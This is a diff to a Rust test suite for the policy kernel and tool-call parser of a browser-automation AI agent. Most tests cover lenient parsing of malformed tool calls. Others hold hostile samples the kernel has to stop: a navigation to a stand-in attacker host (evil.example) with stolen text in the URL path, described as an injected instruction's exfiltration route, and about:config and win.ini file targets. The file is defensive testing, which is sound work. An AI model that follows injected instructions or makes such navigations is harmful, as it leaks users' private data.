@@ -13,13 +13,39 @@
 //! are the regression tests that matter: the harness proved the model will
 //! propose them, so the kernel is what has to refuse.
 
+use crate::extraction;
 use crate::ffi;
+
+
+/// The real tool names, so extraction tests match what ships.
+fn tool_names() -> Vec<String> {
+    crate::contract::Contract::parse(crate::CONTRACT_JSON)
+        .expect("the shipped contract must parse")
+        .tool_names()
+}
+
+
+/// `extract_call` against the shipped contract.
+fn extract(response: &str) -> Option<extraction::ExtractedCall> {
+    extraction::extract_call(response, &tool_names())
+}
 
 fn element(id: &str, role: &str, name: &str) -> ffi::ObservedElement {
     ffi::ObservedElement {
         id: id.to_string(),
         role: role.to_string(),
         name: name.to_string(),
+        sensitivity: String::new(),
+    }
+}
+
+/// An element the browser judged to hold a particular private thing.
+fn sensitive_element(id: &str, name: &str, sensitivity: &str) -> ffi::ObservedElement {
+    ffi::ObservedElement {
+        id: id.to_string(),
+        role: "textbox".to_string(),
+        name: name.to_string(),
+        sensitivity: sensitivity.to_string(),
     }
 }
 
@@ -92,6 +118,38 @@ fn assert_denied(request: &ffi::PolicyRequest) -> ffi::PolicyDecision {
 }
 
 // --- the contract itself ------------------------------------------------
+
+#[test]
+fn opening_a_blank_tab_needs_no_ceremony() {
+    // "can you open a new tab" is about as harmless as a request gets, and it
+    // was reaching the user as an approval prompt: `about:blank` has no origin,
+    // so the destination rules could not check it and escalated it.
+    //
+    // The no-url form of the same call is allowed outright, so this was two
+    // answers for one action -- and the escalated spelling is the one a model
+    // reaches for, because it is the name of the blank page.
+    assert_allowed(&request("tabs.open", r#"{"url":"about:blank"}"#));
+    assert_allowed(&request("tabs.open", "{}"));
+}
+
+#[test]
+fn the_blank_page_is_not_a_licence_for_the_about_scheme() {
+    // The control, and the reason the match above is exact. `about:blank` is
+    // the empty document; the rest of the scheme reaches browser internals and
+    // must still be stopped short of running unchecked.
+    for target in [
+        r#"{"url":"about:config"}"#,
+        r#"{"url":"about:blank#not-really"}"#,
+        r#"{"url":"about:blank/../settings"}"#,
+        r#"{"url":"file:///C:/Windows/win.ini"}"#,
+    ] {
+        let decision = decide(&request("tabs.open", target));
+        assert!(
+            decision.disposition != ffi::Disposition::Allow,
+            "{target} was allowed through without a check"
+        );
+    }
+}
 
 #[test]
 fn embedded_contract_loads() {
@@ -385,8 +443,22 @@ fn the_prompt_listing_comes_from_the_contract() {
     // _for_looking. Any OTHER tool going missing is a bug, which is what this
     // count still catches.
     assert_eq!(listing.lines().filter(|l| l.starts_with("- ")).count(), 17);
-    assert!(listing.contains("- page.click [R1]"));
-    assert!(listing.contains("- tabs.list [R0]"));
+    assert!(listing.contains("- page.click:"));
+    assert!(listing.contains("- tabs.list:"));
+
+    // The listing shows the EXACT call to copy, not a signature.
+    //
+    // A signature invites a model to invent a syntax, and they accept: one
+    // traced run produced five spellings of the same navigation -- an object,
+    // a bare URL, parentheses, a copied [R1] tag, and
+    // browser.navigate?url=... -- each costing a step and one mangled beyond
+    // use. Printing the shape we want is cheaper than parsing every shape we
+    // might get.
+    assert!(listing.contains("{\"name\": \"page.click\", \"arguments\": {\"element_id\": \"...\"}}"), "{listing}");
+
+    // No risk tags: we printed [R1] and a model wrote it back as an argument.
+    assert!(!listing.contains("[R1]"), "{listing}");
+    assert!(!listing.contains("[R0]"), "{listing}");
 
     // The bug this format exists to avoid: with parentheses, qwen2.5:1.5b
     // copied them into the tool name and emitted "browser.back()".
@@ -395,9 +467,9 @@ fn the_prompt_listing_comes_from_the_contract() {
         "no parentheses in the listing:\n{listing}"
     );
 
-    // Optional arguments are marked, required ones are bare.
-    assert!(listing.contains("url?"), "tabs.open's url is optional:\n{listing}");
-    assert!(listing.contains("args: element_id, text"), "{listing}");
+    // Optional arguments are still named, outside the JSON so that copying
+    // the JSON verbatim stays correct.
+    assert!(listing.contains("optional: url"), "{listing}");
 }
 
 
@@ -564,4 +636,254 @@ fn a_name_inside_someone_elses_domain_does_not_count() {
         "a lookalike domain was treated as expected: {}",
         decision.reason
     );
+}
+
+#[test]
+fn typing_a_card_number_is_refused_outright() {
+    // The same argument as the password rule, which was written as being about
+    // credentials and is really about a class: fields whose contents the agent
+    // cannot legitimately possess. It has no card number, so anything it typed
+    // here was invented or copied off a page it had no business reading.
+    let mut request = request(
+        "page.type",
+        r#"{"element_id":"e9","text":"4111111111111111"}"#,
+    );
+    request.elements = vec![sensitive_element("e9", "Card number", "payment_card")];
+
+    let decision = assert_denied(&request);
+    assert!(
+        decision.reason.contains("card"),
+        "the user is not told what was refused: {}",
+        decision.reason
+    );
+}
+
+#[test]
+fn an_ordinary_field_is_still_typed_into() {
+    // The negative control. A rule that refused everything would pass the test
+    // above and make the agent useless.
+    let mut request = request("page.type", r#"{"element_id":"e9","text":"cats"}"#);
+    request.elements = vec![sensitive_element("e9", "Search", "")];
+    assert_allowed(&request);
+}
+
+#[test]
+fn a_destination_carrying_data_in_its_path_is_questioned() {
+    // The bypass: the check looked for `?` and `#` and never at the path, so
+    // the same stolen text moved one character to the left went through. This
+    // is the shape an injected instruction takes once its author has read the
+    // rule.
+    let request = request(
+        "browser.navigate",
+        r#"{"url":"https://evil.example/log/the-user-was-just-reading-their-bank-statement-and-account-balance-online"}"#,
+    );
+    assert_asks(&request);
+}
+
+#[test]
+fn an_ordinary_address_is_not_questioned_for_having_a_path() {
+    // The control that keeps the rule usable. Normal addresses have paths, and
+    // asking about every one of them would train the user to click yes.
+    let request = request("browser.navigate", r#"{"url":"https://en.wikipedia.org/wiki/Cat"}"#);
+    assert_allowed(&request);
+}
+
+#[test]
+fn a_call_written_as_a_call_is_understood() {
+    // MEASURED: qwen2.5:7b replied `task.ask("Did you mean ...")` twenty times
+    // out of twenty in one traced run, and every one was discarded as "not a
+    // tool call" because there is not a brace in it. The model had understood
+    // the task and named a real tool. The harness could not read the sentence.
+    let call = extract(
+        r#"task.ask("Did you mean the latest Sidemen video on YouTube?")"#,
+    )
+    .expect("a call written as a call was not recognised");
+    assert_eq!(call.name, "task.ask");
+    assert_eq!(
+        call.arguments_json,
+        r#""Did you mean the latest Sidemen video on YouTube?""#
+    );
+}
+
+#[test]
+fn a_call_with_keyword_arguments_is_understood() {
+    let call = extract(r#"page.click(element_id="e3")"#)
+        .expect("keyword arguments were not recognised");
+    assert_eq!(call.name, "page.click");
+    assert_eq!(call.arguments_json, r#"{"element_id":"e3"}"#);
+}
+
+#[test]
+fn a_call_with_an_object_argument_is_understood() {
+    let call = extract(r#"page.type({"element_id":"e1","text":"hi"})"#)
+        .expect("an object argument was not recognised");
+    assert_eq!(call.name, "page.type");
+    assert!(call.arguments_json.contains("\"text\""), "{}", call.arguments_json);
+}
+
+#[test]
+fn a_call_with_no_arguments_is_understood() {
+    let call = extract("browser.back()").expect("no-arg call missed");
+    assert_eq!(call.name, "browser.back");
+    assert_eq!(call.arguments_json, "{}");
+}
+
+#[test]
+fn json_still_wins_over_the_call_form() {
+    // The control. JSON is unambiguous and must keep taking precedence, so a
+    // reply that contains both is read the way the model most likely meant.
+    let call = extract(
+        r#"I will do page.click(nonsense) -- {"name":"page.click","arguments":{"element_id":"e9"}}"#,
+    )
+    .expect("the JSON object was not found");
+    assert_eq!(call.name, "page.click");
+    assert!(call.arguments_json.contains("e9"), "{}", call.arguments_json);
+}
+
+#[test]
+fn prose_is_still_not_a_call() {
+    // The negative control, and the reason the name test is strict. Ordinary
+    // sentences contain full stops and brackets; none of that may look like a
+    // tool call or the harness will invent actions the model never proposed.
+    assert!(extract("I am not sure. (maybe try again)").is_none());
+    assert!(extract("Let me think about this (carefully).").is_none());
+    assert!(extract("See www.example.com (the site)").is_none());
+}
+
+#[test]
+fn a_bare_name_with_an_empty_list_is_a_call() {
+    // MEASURED: qwen2.5:7b wrote `task.complete []` twenty times in a row while
+    // trying to end a task it had finished. No parentheses anywhere. The first
+    // version of the call reader required them and threw all twenty away.
+    let call = extract("task.complete []")
+        .expect("`task.complete []` was not recognised as a call");
+    assert_eq!(call.name, "task.complete");
+    assert_eq!(call.arguments_json, "{}", "an empty list means no arguments");
+}
+
+#[test]
+fn a_bare_name_on_its_own_is_a_call() {
+    let call = extract("browser.back").expect("bare name missed");
+    assert_eq!(call.name, "browser.back");
+    assert_eq!(call.arguments_json, "{}");
+}
+
+#[test]
+fn a_bare_name_with_an_object_is_a_call() {
+    let call = extract(r#"page.click {"element_id":"e3"}"#)
+        .expect("bare name with an object missed");
+    assert_eq!(call.name, "page.click");
+    assert!(call.arguments_json.contains("e3"), "{}", call.arguments_json);
+}
+
+#[test]
+fn a_word_that_is_not_a_tool_is_not_a_call() {
+    // Matching against the real tool names is what keeps sentences out, and it
+    // is exact rather than a guess about punctuation.
+    assert!(extract("the.thing is here").is_none());
+    assert!(extract("i.e. the page moved").is_none());
+    assert!(extract("I will look at the page and decide.").is_none());
+    // A name must end where the name ends.
+    assert!(extract("page.clicked twice").is_none());
+}
+
+#[test]
+fn a_bare_url_after_a_tool_name_is_a_call() {
+    // MEASURED: qwen2.5:7b wrote `browser.navigate https://...` with no
+    // brackets at all. It was thrown away for want of punctuation, which is the
+    // harness being the problem rather than the model.
+    let call = extract("browser.navigate https://www.youtube.com/results?search_query=sidemen")
+        .expect("a bare URL after a tool name was not recognised");
+    assert_eq!(call.name, "browser.navigate");
+    assert!(call.arguments_json.contains("youtube.com"), "{}", call.arguments_json);
+}
+
+#[test]
+fn the_risk_tag_we_print_is_not_part_of_the_arguments() {
+    // MEASURED: the tool listing prints `- browser.navigate [R1] Load a URL`,
+    // and the model copied the tag back: `browser.navigate [R1] {"url": ...}`.
+    // Reading that tail whole made the URL the literal text `[R1] {"url": ...}`
+    // -- so the navigation failed AND the kernel could not find a destination
+    // in it, so it asked the user to approve every navigation. We printed the
+    // tag; refusing to read it back was our bug.
+    let call = extract(r#"browser.navigate [R1] {"url": "https://example.com/x"}"#)
+        .expect("a risk tag stopped the call being read");
+    assert_eq!(call.name, "browser.navigate");
+    assert_eq!(call.arguments_json, r#"{"url":"https://example.com/x"}"#);
+}
+
+#[test]
+fn positional_arguments_map_onto_the_tools_properties() {
+    // MEASURED: qwen2.5:7b called `page.select "e1", "Price"` -- which says
+    // exactly what it means -- and the harness refused it with "arguments are
+    // not a JSON object". The contract knows the properties and their order.
+    let call = extract(r#"page.select "e1", "Price""#)
+        .expect("a positional argument list was not read as a call");
+    assert_eq!(call.name, "page.select");
+    let kernel = crate::load_kernel();
+    let normalized = kernel.normalize_arguments("page.select", &call.arguments_json);
+    assert!(normalized.contains(r#""element_id":"e1""#), "{normalized}");
+    assert!(normalized.contains(r#""value":"Price""#), "{normalized}");
+}
+
+#[test]
+fn a_bare_answer_still_reaches_task_complete() {
+    // The regression this guards. Making `answer` optional -- so that finishing
+    // without a summary still counts as finishing -- left task.complete with no
+    // REQUIRED properties, and the bare-value wrapping was keyed on there being
+    // exactly one required property. `task.complete "what I did"` silently
+    // stopped being an object and was refused.
+    let kernel = crate::load_kernel();
+    let normalized = kernel.normalize_arguments("task.complete", r#""played the video""#);
+    assert_eq!(normalized, r#"{"answer":"played the video"}"#);
+}
+
+#[test]
+fn prose_with_a_comma_is_not_an_argument_list() {
+    // The control. Every piece has to be a value in its own right, or it is a
+    // sentence that happens to contain a comma.
+    assert!(extract("task.ask (well, maybe not)").is_none()
+        || !extract("task.ask (well, maybe not)")
+            .unwrap()
+            .arguments_json
+            .starts_with('['));
+}
+
+#[test]
+fn a_bracketed_answer_is_not_eaten_by_the_risk_tag_strip() {
+    // MEASURED: the model wrote
+    // `task.complete [ASUS Prime GeForce RTX 5060 Ti ...]` and the harness
+    // returned "nothing was said". The tag strip was written for `[R1]` and
+    // matched ANY leading bracket group, so it deleted the whole answer.
+    let call = extract("task.complete [ASUS Prime GeForce RTX 5060 Ti 16GB]")
+        .expect("a bracketed answer was not read as a call");
+    assert_eq!(call.name, "task.complete");
+    assert!(
+        call.arguments_json.contains("ASUS"),
+        "the answer was eaten: {}",
+        call.arguments_json
+    );
+}
+
+#[test]
+fn a_real_risk_tag_is_still_stripped() {
+    // The other half. We print `- browser.navigate [R1] ...` in the listing, so
+    // a model that copies the tag back must not have it treated as an argument.
+    let call = extract(r#"browser.navigate [R1] {"url": "https://example.com/x"}"#)
+        .expect("a risk tag stopped the call being read");
+    assert_eq!(call.arguments_json, r#"{"url":"https://example.com/x"}"#);
+}
+
+#[test]
+fn an_unknown_argument_is_dropped_rather_than_refused() {
+    // MEASURED: `page.find {"query": "RTX 4090", "filter": "price"}` was refused
+    // outright with "unexpected argument `filter`" -- a perfectly good query
+    // thrown away because the model added a hint beside it.
+    let kernel = crate::load_kernel();
+    let normalized = kernel.normalize_arguments(
+        "page.find",
+        r#"{"query":"RTX 4090","filter":"price"}"#,
+    );
+    assert!(normalized.contains(r#""query":"RTX 4090""#), "{normalized}");
+    assert!(!normalized.contains("filter"), "{normalized}");
 }
